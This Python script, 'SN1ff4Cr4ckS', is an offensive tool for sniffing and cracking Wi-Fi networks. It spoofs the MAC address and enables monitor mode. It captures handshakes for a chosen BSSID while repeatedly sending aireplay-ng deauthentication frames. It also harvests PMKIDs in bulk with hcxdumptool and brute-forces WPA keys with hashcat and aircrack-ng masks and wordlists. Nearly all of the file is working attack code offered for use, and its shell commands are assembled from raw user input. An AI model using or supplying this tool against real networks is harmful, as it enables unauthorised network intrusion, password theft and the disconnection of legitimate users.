#SN1ff4Cr4ckS.py
from re import sub
import subprocess
import logging
import time
import signal
import platform
import sys
import os
from colorama import Fore
from threading import Thread


#Ctrl + c
def def_handler(sig, frame):
    limpieza()
    print(Fore.LIGHTYELLOW_EX + "\n\n[!] " + Fore.LIGHTRED_EX + "Exiting... " + Fore.LIGHTBLUE_EX + "｡ ◕ - ◕ ｡\n")
    time.sleep(0.6)
    limpieza()
    print(Fore.LIGHTYELLOW_EX + "\n\n[!] " + Fore.LIGHTRED_EX + "Exiting... " + Fore.LIGHTBLUE_EX  + "｡ - - - ｡\n")
    time.sleep(0.3)
    limpieza()
    print(Fore.LIGHTYELLOW_EX + "\n\n[!] " + Fore.LIGHTRED_EX + "Exiting... " + Fore.LIGHTBLUE_EX  + "｡ ◕ - ◕ ｡\n")
    time.sleep(0.6)
    limpieza()
    print(Fore.LIGHTYELLOW_EX + "\n\n[!] " + Fore.LIGHTRED_EX + "Exiting... " + Fore.LIGHTBLUE_EX  + "｡ - - - ｡\n")
    time.sleep(0.3)
    limpieza()
    print(Fore.LIGHTYELLOW_EX + "\n\n[!] " + Fore.LIGHTRED_EX + "Exiting... " + Fore.LIGHTBLUE_EX  + "｡ ◕ - ◕ ｡\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def ls():
    if platform.system() == 'Windows':
        subprocess.run('dir', shell=True)
    elif platform.system() == 'Linux':
        subprocess.run('ls', shell=True)


#Clean data
def limpieza():
      if platform.system() == 'Linux':
            subprocess.run("clear", shell=True)
      elif platform.system() == 'Windows':
            subprocess.run("cls", shell=True)
limpieza()

print(Fore.LIGHTRED_EX + "||| " + Fore.LIGHTBLUE_EX + "$~~$~~$~~$~~     --" + Fore.LIGHTRED_EX + " SN1ff4Cr4ckS " + Fore.LIGHTBLUE_EX + "--     ~~$~~$~~$~~$" + Fore.LIGHTRED_EX + " |||\n")


time.sleep(2)
def print_interfaces():

    print(Fore.LIGHTBLUE_EX + "\n\n|||||||||||||||" + Fore.RED + "INTERFACES" + Fore.LIGHTBLUE_EX + "|||||||||||||||\n")

    if platform.system() == 'Linux':
            subprocess.run("ifconfig", shell=True)
    elif platform.system() == 'Windows':
            subprocess.run("ipconfig", shell=True)


def Cracker():
    limpieza()
    time.sleep(2)
    print(Fore.LIGHTYELLOW_EX + 'CR444CKKKK333333RRR 888~~~~~~~~~~~##~~~~~~~~@')
    time.sleep(0.4)
    limpieza()
    print(Fore.LIGHTGREEN_EX + 'CR444CKKKK333333RRR 88888~~~~~~~~~###~~~~~~@@@@')
    time.sleep(0.8)
    limpieza()
    print(Fore.LIGHTYELLOW_EX + 'CR444CKKKK333333RRR 888888~~~~~~~~######~~~~~~~@@@@@@@@@')
    time.sleep(0.4)
    limpieza()
    print(Fore.LIGHTRED_EX + 'CR444CKKKK333333RRR 88888888888~~~~##########~~~~>>>>>>> TobbyIsDobby PWN!\n')
    time.sleep(0.8)
    ls()
    file_selected = input('\nSelect the file you want to crack\n>')
    tarea=1
    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with phonenumbers?(Y,n)\n>')
    if yes_no in num:
            prefijo = input('If you want introduce a prefix\n>')
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ' + prefijo +'?d?d?d?d?d?d?d?d?d -o ./phonenumbers_cracked.txt', shell=True)
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ' + prefijo + '?d?d?d?d?d?d?d?d?d -o ./phonenumbers_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > phonenumbers_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()

    num = ("y", '')
    yes_no = input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with brute force attack 8 digits form?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -m 22000 ' + file_selected + ' -a 3 ?d?d?d?d?d?d?d?d -o ./bruteforce_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -m 22000 ' + file_selected + ' -a 3 ?d?d?d?d?d?d?d?d -o ./bruteforce_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > bruteforce_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()

    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with 8 digits numbers?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d -o ./numbers8digits_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d -o ./numbers8digits_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > numbers8digits_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()

    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with 9 digits numbers?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d?d -o ./numbers9digits_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d?d -o ./numbers9digits_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > numbers9digits_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()
    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with 10 digits numbers?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d?d?d -o ./numbers10digits_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?d?d?d?d?d?d?d -o ./numbers10digits_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > numbers10digits_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()
    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with 8 lower case letters?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ?l?l?l?l?l?l?l?l -o ./8lowercaseletter_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ?l?l?l?l?l?l?l?l -o ./8lowercaseletter_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > 8lowercaseletter_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()
    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with mix format (letters, numbers and more)?(Y,n)\n>')
    if yes_no in num:
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?s?s?l?l?l?l?u -o ./mixformat_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + file_selected + ' ?d?d?d?s?s?l?l?l?l?u -o ./mixformat_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > mixformat_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    limpieza()
    
    num = ('y', '')
    yes_no =  input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' Do you want to crack with a wordlist?(Y,n)\n>')
    if yes_no in num:
            wordlist_ = input('Introduce the wordlist you want to use\n>')
            if platform.system() == 'Linux':
                subprocess.run('sudo hashcat -a 3 -w4 -m 22000 ' + str(file_selected) + ' -w ' + str(wordlist_) + ' -o ./wordlistformat_cracked.txt', shell=True)
            if platform.system() == 'Windows':
                subprocess.run('hashcat.exe -a 3 -w4 -m 22000 ' + str(file_selected) + ' -w ' + str(wordlist_) + ' -o ./wordlistformat_cracked.txt', shell=True)
            print(Fore.LIGHTRED_EX + '[!]The output > wordlistformat_cracked.txt\n')
            print(Fore.GREEN + 'Done!\n')
    for i in num:
            if yes_no != i:
                limpieza()
    

    
election = input(Fore.LIGHTRED_EX + '[#]' + Fore.LIGHTGREEN_EX + ' What do you want to do?' + Fore.LIGHTBLUE_EX + ' Crack[1] or Sniff[2]?\n>')
if election == '1':
    Cracker()

elif election == '2':
    tarea = 1
    print(Fore.RED + "||" + Fore.BLUE + "Printing available interfaces" + Fore.RED + "||\n")
    print_interfaces()
    print('\n')
    time.sleep(1.5)
select = input(Fore.GREEN +'\n[#]What type of sniff and crack you want to use?\n\n' + Fore.BLUE + '-Sniff4Crack single Wifi(1)' + Fore.YELLOW + ' 0R ' + Fore.RED + '-Sniff4Crack Wifi at Scale (2)\n' + Fore.GREEN + '>')
vari = ('1','') 
if select in vari:
  while True:

    try:
        interfaz = str(input("\n\n|| Introduce the interface you want to sniff and crack(ej:eth0, wlan0...) || > "))
    except KeyboardInterrupt:
        print("\n"*8 + "[!]Exiting...\n")
        sys.exit(1)

    lista_interfaces = ("wlan0", "eth0")
    for i in lista_interfaces:
      
        if str(interfaz) == "wlan0":
            print("La interfaz es " + str(interfaz))
            subprocess.run("ifconfig " + str(interfaz) + " down", shell=True)
            subprocess.run("macchanger -r " + str(interfaz) + " && ifconfig " + str(interfaz) + " up", shell=True)
            subprocess.run("airmon-ng check kill >/dev/null", shell=True)
            airmon_ng = subprocess.run("airmon-ng start " + str(interfaz), shell=True)
            if airmon_ng == 0:
                print(str(interfaz) + " está ahora en modo monitor " + str(interfaz) + "mon")
                interfaz = interfaz + "mon"
        
            scan = input("\nStart the scan for discover wifis? Yes=Enter, No=(Ctrl+C)bye bye")
            lista_scan = ("", "Yes", "yes", "si", "Si")
            for i in lista_scan:
                if scan == i:
                    try:
                        archivo_cap = input("Introduce nmae for the file pcap (Ejm:'wifi_crack') >")
                        bssid = input("Introduce the bssid of the wifi you are going to work on it(Ejm: '6S:9E:6M:9E:6N') >")
                        channel = input("Introduce the channel where that wifi is(Ejm:'69') >")
                        hash_capture = str('import subprocess\n' + 'subprocess.run("airodump-ng -w ' + str(archivo_cap) + ' --output-format pcap --bssid ' + str(bssid) + ' --channel ' + str(channel) + ' ' + str(interfaz) + '",shell=True)')
                        subprocess.run("echo '" + str(hash_capture) + "' > hash.py", shell=True)
                        os.system("\ngnome-terminal -e 'python3 hash.py' 2>/dev/null\n\n")

                        def deauth():
                            subprocess.run("aireplay-ng -0 10 -a " + str(bssid) + " --ignore-negative-one " + str(interfaz), shell=True)
                        def hash_option():
                            cap = input("\nWhat do you want to do with the capture? Delete?(rm) Save it?(save) Analyze with wireshark?(shark) Crack it?(crack)\n=>")
                            if cap == "rm":
                                subprocess.run("rm " + str(archivo_cap) + ".cap", shell=True)
                            elif cap == "save":
                                print("Finishing programe...!")
                                time.sleep(2)
                                sys.exit(1)
                            elif cap == "shark":
                                subprocess.run("wireshark " + str(archivo_cap) + ".cap",shell=True)
                            elif cap == "crack":
                                dictionary = input("\nIntroduce a wordlist for work\n=>")
                                subprocess.run("aircrack-ng -w " + str(dictionary) + " " + str(archivo_cap) + "-01.cap", shell=True)
                        print("||||||||||||||||||||||Deauthenticating||||||||||||||||||||||\n\n")
                        deauth()
                                    
                        while True:
                            deauth_ = input("\nDo you want to deauth again?(Yes = Enter, No = Ctrl + C)\n")
                            lista_deauth_ = ("", "yes", "Yes", "si")
                            for i in lista_deauth_:
                                if deauth_ == i:
                                    deauth()
                                    continue
                                

                                
                    except KeyboardInterrupt:
                        subprocess.run("rm hash.py", shell=True)
                        hash_option()
                        print("\n")

                        
                          
                elif scan != i:
                        print(Fore.GREEN + "Bye bye!")
                        break
        break
    







    if str(interfaz[0:3]) == "wlx":

        print("The interface is " + str(interfaz))
        subprocess.run("ifconfig " + str(interfaz) + " down", shell=True)
        subprocess.run("macchanger -r " + str(interfaz) + " && ifconfig " + str(interfaz) + " up", shell=True)
        subprocess.run("airmon-ng check kill >/dev/null", shell=True)
        airmon_ng = subprocess.run("airmon-ng start " + str(interfaz), shell=True)
        if airmon_ng == 0:
            print(str(interfaz) + " is on monitor mode = " + str(interfaz) + "mon")
        
        scan = input("\nDo you want to start the wifi scan? Yes=Enter, No=(Ctrl+C)bye bye\n>")
        lista_scan = ("", "Yes", "yes", "si", "Si")
        for i in lista_scan:
            if scan == i:
                try:
                    subprocess.run("airodump-ng " + str(interfaz), shell=True) #No se aÃ±ade 'mon' a wlx34e894d2f348
                except KeyboardInterrupt:
                    try:
                        print("\n|||||||||||||||||||Sc4n C0mPl3t3||||||||||||||||||||")

                        captura = input("\nDo you want to sniff any wifi? Yes=Enter, No=(Ctrl+C)Bye bye")
                        lista_captura = ("", "Yes", "yes", "si", "Si")
                        for i in lista_captura:
                            if captura == i:
                                try:
                                    archivo_cap = input("Introduce a name for the pcap file (Ejm:'wifi_crack') >")
                                    bssid = input("Introduce the bssid of the selected wifi (Ejm: '6S:9E:6M:9E:6N') >")
                                    channel = input("Introduce the channel where the wifi is(Ejm:'69') >")
                                    hash_capture = str('import subprocess\n' + 'subprocess.run("airodump-ng -w ' + str(archivo_cap) + ' --output-format pcap --bssid ' + str(bssid) + ' --channel ' + str(channel) + ' ' + str(interfaz) + '",shell=True)')
                                    subprocess.run("echo '" + str(hash_capture) + "' > hash.py", shell=True)
                                    os.system("\ngnome-terminal -e 'python3 hash.py' 2>/dev/null\n\n")

                                    def deauth():
                                        subprocess.run("aireplay-ng -0 10 -a " + str(bssid) + " --ignore-negative-one " + str(interfaz), shell=True)
                                    def hash_option():
                                        cap = input("\nWhat do you want to do with the capture? Delete?(rm) Save?(save) Analyze with wireshark?(shark) Crack it?(crack) =>")
                                        if cap == "rm":
                                            subprocess.run("rm " + str(archivo_cap) + ".cap", shell=True)
                                        elif cap == "save":
                                            print("Finishing programe...!")
                                            time.sleep(2)
                                            sys.exit(1)
                                        elif cap == "shark":
                                            subprocess.run("wireshark " + str(archivo_cap) + ".cap",shell=True)
                                        elif cap == "crack":
                                            dictionary = input("\nIntroduce a wordlist for work\n=>")
                                            subprocess.run("aircrack-ng -w " + str(dictionary) + " " + str(archivo_cap) + "-01.cap", shell=True)
                                    print("||||||||||||||||||||||Deauthenticating||||||||||||||||||||||\n\n")
                                    deauth()
                                    
                                    while True:
                                        deauth_ = input("\nDo you want to deauth again? (Yes = Enter, No = Ctrl + C)\n")
                                        lista_deauth_ = ("", "yes", "Yes", "si")
                                        for i in lista_deauth_:
                                            if deauth_ == i:
                                                deauth()
                                                continue
                                

                                
                                except KeyboardInterrupt:
                                    subprocess.run("rm hash.py", shell=True)
                                    hash_option()
                                    print("\n")
                            


                    
                    
                    except KeyboardInterrupt:
                        print("\n"*8 + "[!]Exiting...\n")
                        sys.exit(1)
                    


            elif scan != i:
                print("Bye bye!")
                break

    break
    
elif select == '2':
    limpieza()
    print(Fore.RED + '<|||>' + Fore.BLUE + 'Cracking Masive Wifi' + Fore.RED + '<|||>')
    while True:

            print(Fore.GREEN + '[·]Building the package' + Fore.LIGHTYELLOW_EX + ' Hcxdumptool\n')
            subprocess.run('sudo apt-get update', shell=True)
            subprocess.run('sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev', shell=True)
            subprocess.run('sudo apt-get install libcurl4-OpenSSL-dev libssl-dev pkg-config', shell=True)
            subprocess.run('git clone https://github.com/ZerBea/hcxdumptool.git ', shell=True)
            subprocess.run('cd hcxdumptool && make', shell=True)
            subprocess.run('git clone https://github.com/ZerBea/hcxtools.git', shell=True)
            subprocess.run('cd hcxtools/ && sudo make && sudo make install', shell=True)
            subprocess.run('sudo apt install hcxdumptool', shell=True)
            print(Fore.GREEN + '\n[.]Installing drivers with monitor mode capability\n')
            subprocess.run('git clone -b v5.6.4.2 https://github.com/aircrack-ng/rtl8812au.git', shell=True)
            subprocess.run('cd rtl8812au && sudo make && sudo make install', shell=True)
            print(Fore.GREEN + '[.]Shutting down services that might interrupt with Hcxdumptool')
            subprocess.run('sudo systemctl stop wpa_supplicant', shell=True)
            subprocess.run('sudo service NetworkManager stop', shell=True)
            limpieza()

            print(Fore.LIGHTRED_EX + '|||||||||||||------- ' + Fore.LIGHTBLUE_EX + 'SNIIII11111FFI1111NG P444RT77777Y' + Fore.LIGHTRED_EX + ' -------|||||||||||||')
            time.sleep(0.6)
            limpieza()
            print(Fore.LIGHTYELLOW_EX + '-------||||||||||||| ' + Fore.LIGHTGREEN_EX + 'SNIIII11111FFI1111NG P444RT77777Y' + Fore.LIGHTYELLOW_EX + '  |||||||||||||-------')
            time.sleep(0.3)
            limpieza()
            print(Fore.LIGHTBLUE_EX + '|||||||||||||-------  ' + Fore.LIGHTRED_EX + 'SNIIII11111FFI1111NG P444RT77777Y' + Fore.LIGHTBLUE_EX + ' -------|||||||||||||')
            time.sleep(0.6)
            limpieza()
            print(Fore.LIGHTYELLOW_EX + '-------||||||||||||| ' + Fore.LIGHTGREEN_EX + 'SNIIII11111FFI1111NG P444RT77777Y' + Fore.LIGHTYELLOW_EX + ' |||||||||||||-------')
            print_interfaces()
            
            interfaces = input(Fore.LIGHTBLUE_EX + '\nIntroduce the interface name of the device you are going to use for the sniff(Example:wlan0)\n>')
            file_pcapng = input(Fore.LIGHTBLUE_EX + 'Introduce the name for the output file of the execution(Example:Wifi-PMKID)\n>')
            file_pcapng_ = file_pcapng + '.pcapng'
            subprocess.run('sudo ./hcxdumptool/hcxdumptool -i ' + str(interfaces) + ' -o ' + str(file_pcapng_) + ' --disable_deauthentication --disable_client_attacks --enable_status=3', shell=True)
            time.sleep(1)
            limpieza()

            print(Fore.LIGHTYELLOW_EX + '-------||||||||||||| ' + Fore.LIGHTGREEN_EX + 'CR444AACK11IINGGG P444RTTTT77777Y' + Fore.LIGHTYELLOW_EX + ' |||||||||||||-------')
            subprocess.run('hcxpcapngtool -o Wi-Fi_pmkid_hash_22000_file.txt ' + str(file_pcapng_), shell=True)
            print(Fore.LIGHTYELLOW_EX + 'The output is > Wi-Fi_pmkid_hash_22000_file.txt >>' + Fore.LIGHTRED_EX + '[!](The file you now should crack with hashcat or other tool of your election)')
            crack = input(Fore.GREEN + 'Do you want to crack on this device? (y/n)(You can run this script on windows for the crack)\n>')

            if crack == 'y':
                Cracker()
            elif crack == 'n':
                exit(1)
            
            


for i in lista_interfaces:
    if str(interfaz) != i:
         subprocess.run("clear")
         print(Fore.RED + "\nThe selected interface is not available, try with another.") 
         break
            
   